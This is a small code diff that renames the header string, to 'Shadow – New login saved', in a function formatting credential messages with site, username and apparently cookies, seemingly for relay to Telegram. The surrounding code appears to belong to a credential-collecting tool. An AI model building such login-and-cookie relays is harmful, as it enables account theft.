@@ -11,7 +11,7 @@ const TELEGRAM_MAX_LEN = 4096;
 
 function formatCredentialMessage(entry, cookies) {
   const lines = [
-    '🔐 New login saved',
+    '🔐 Shadow – New login saved',
     '',
     `Site: ${entry.hostname || entry.url || '—'}`,
     `Username: ${entry.username || '—'}`,
